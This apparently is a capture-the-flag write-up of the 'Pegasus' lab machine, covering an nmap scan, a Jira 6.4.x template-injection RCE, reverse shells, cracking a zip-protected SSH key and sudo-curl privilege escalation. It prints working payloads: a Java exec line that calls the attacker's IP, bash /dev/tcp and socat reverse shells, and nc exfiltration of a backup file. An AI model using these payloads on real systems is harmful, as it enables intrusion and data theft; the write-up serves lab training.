---
layout: post
title: "CTF7E4 - PEGASUS Machine"
categories: CTF7E4
---

## Summary
&nbsp;
This machine had an old Jira instance running on port 8080 which has a remote code execution vulnerability in "Contact Administrators" form. When sending an email to Administrators through this form, it's possible to inject java code into Subject and Body message. The privilege escalation required some steps such as finding a backup file, cracking the zip password with private ssh key of user "Harvey" inside, then running curl with root permissions.

&nbsp;

- **OS:** Linux
- **IP:** 10.10.10.33
- **Difficulty:** Medium

## Steps
&nbsp;

In order to hack this machine, we should know what ports are open and we can do that by using a popular tool such as Nmap.

> **→ nmap -sC -sV -oN scan 10.10.10.33**{: style="color: red"}

**-sC** Use default scripts
**-sV** Probe open ports to determine service/version info
**-oN** Save output in nmap format.
&nbsp;

```
Nmap scan report for 10.10.10.33
Host is up (0.028s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 89:53:8b:26:aa:11:32:a0:2b:ac:17:26:74:91:16:f4 (RSA)
|   256 ff:97:ac:ee:c6:ef:9a:60:19:a1:92:c9:d1:7e:99:d5 (ECDSA)
|_  256 32:7b:60:9a:a6:d8:6a:42:46:dd:22:98:f2:6b:43:95 (ED25519)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 6 disallowed entries 
| /sr/ /si/ /charts /secure/ConfigureReport.jspa 
|_/secure/ConfigureReport!default.jspa /secure/attachmentzip/
|_http-server-header: Apache-Coyote/1.1
| http-title: System Dashboard - Pegasus Cyber
|_Requested resource was http://10.10.10.33:8080/secure/Dashboard.jspa
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
&nbsp;
&nbsp;

Browsing to http://10.10.10.33:8080/secure/Dashboard.jspa, on the bottom of the page we can see it's using an outdated version **v6.4.x**

&nbsp;
![pegasus]({{ site.baseurl }}/assets/images/ctf7e4/machines/pegasus1.png){:.images}
&nbsp;

After some quick google searching we can see that there are many PoCs available on how to exploit this version. 

&nbsp;
![pegasus]({{ site.baseurl }}/assets/images/ctf7e4/machines/pegasus2.png){:.images}
&nbsp;

As I mentioned before, the vulnerability exists on "Contact Administrators" form so we are going to abuse this as seen on the following screenshots.

&nbsp;
![pegasus]({{ site.baseurl }}/assets/images/ctf7e4/machines/pegasus3.png){:.images}
&nbsp;

&nbsp;
![pegasus]({{ site.baseurl }}/assets/images/ctf7e4/machines/pegasus4.png){:.images}
&nbsp;

To confirm that there is a Remote Command Execution, we are going to listen on a random port and make a request to our machine.

> **→ nc -lnvp 9000**{: style="color: red"}

And put this payload on the Subject and Body field:
&nbsp;
```java
$i18n.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl 10.10.20.2:9000/?spenkk").waitFor()
```

&nbsp;
![pegasus]({{ site.baseurl }}/assets/images/ctf7e4/machines/pegasus5.png){:.images}
&nbsp;

&nbsp;
![pegasus]({{ site.baseurl }}/assets/images/ctf7e4/machines/pegasus6.png){:.images}
&nbsp;

Since we had a connection back to our listener, let's try to get a reverse shell. There are [many ways](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) on how we can get a reverse shell and I will try the most basic one:
> **→ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1**{: style="color: red"}

&nbsp;
![pegasus]({{ site.baseurl }}/assets/images/ctf7e4/machines/pegasus7.png){:.images}
&nbsp;

Even if we don't get a connection back it doesn't mean that it's not vulnerable. There is a binary called Socat which is often used in these cases and it's very stable.
&nbsp;

Attacker machine:
> **→ socat file:`tty`,raw,echo=0 TCP-L:1337**{: style="color: red"}

Payload:
> **→ $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('socat tcp-connect:10.10.20.2:1337 exec:sh,pty,stderr,setsid,sigint,sane').waitFor()**{: style="color: red"}

&nbsp;
![pegasus]({{ site.baseurl }}/assets/images/ctf7e4/machines/pegasus8.png){:.images}
&nbsp;

We got a reverse shell as user **"jira"**.

&nbsp;
![pegasus]({{ site.baseurl }}/assets/images/ctf7e4/machines/pegasus9.png){:.images}
&nbsp;

We continued our local enumeration and found a backup file on /var/tmp/backup.zip
&nbsp;
To transfer this file to our machine we can use **nc**.
&nbsp;
Attacker machine:
> **→ nc -lp 5555 > backup.zip**{: style="color: red"}

Pegasus Machine:
> **→ nc -w 3 10.10.20.2 5555 < backup.zip**{: style="color: red"}

Backup.zip was password protected but we can crack it using different tools, I prefer using [John](https://github.com/magnumripper/JohnTheRipper), but first we should convert the zip file to hash format in order for "John" to crack it.

> **→ ssh2john backup.zip >> backup.john**{: style="color: red"}

Then we can finally use John to crack it using a prefered wordlist.

> **→ john backup.john --wordlist=~/tools/SecLists/Passwords/rockyou.txt**{: style="color: red"}

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
999999999        (backup.zip/harvey_key)
1g 0:00:00:00 DONE (2020-02-03 11:13) 33.33g/s 546133p/s 546133c/s 546133C/s 123456..christal
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
&nbsp;

&nbsp;
![pegasus]({{ site.baseurl }}/assets/images/ctf7e4/machines/pegasus10.png){:.images}
&nbsp;

> **→ unzip backup.zip**{: style="color: red"}

```
Archive:  backup.zip
[backup.zip] harvey_key password: 999999999
  inflating: harvey_key 
```

> **→ cat harvey_key**{: style="color: red"}


```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsvqT8DA9wf3/303V8fk1n3ZLHIpwMTiG91JlORWNSLgz4ykX
..[SNIP]..
O8cJQ/XNm6cOF/hml+Qp4YDeskmAkQqhjkwwYIgw2qD6+lHlxR/Gdw==
-----END RSA PRIVATE KEY-----
```

&nbsp;
![pegasus]({{ site.baseurl }}/assets/images/ctf7e4/machines/pegasus11.png){:.images}
&nbsp;

We logged in as user Harvey and started enumeration for local privilege escalation.

> **→ harvey@pegasus:~$ id**{: style="color: red"}

uid=1002(harvey) gid=1002(harvey) groups=1002(harvey)

> **→ harvey@pegasus:~$ sudo -l**{: style="color: red"}

```
Matching Defaults entries for harvey on pegasus:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harvey may run the following commands on pegasus:
    (ALL) NOPASSWD: /usr/bin/curl
```
&nbsp;

From the command above, we can see that Harvey can use curl with root permissions without entering a password and without being into sudo group. So lets try to send the /root/flag.txt to our machine with a post request.

&nbsp;
![pegasus]({{ site.baseurl }}/assets/images/ctf7e4/machines/pegasus12.png){:.images}
&nbsp;

As we can see, python default http server doesn't accept POST requests. We can modify it or find an already modified version on github but since the file is stored on the local machine that we're already in then we can use **file://** protocol to read it.

> **→ harvey@pegasus:~$ sudo curl file:///root/flag.txt**{: style="color: red"}

XOR{78a9776eba860f614e643e54e0815ee3b5aa8906}

&nbsp;
![pegasus]({{ site.baseurl }}/assets/images/ctf7e4/machines/pegasus13.png){:.images}
&nbsp;


&nbsp;
I hope you had fun solving this machine and learning something new.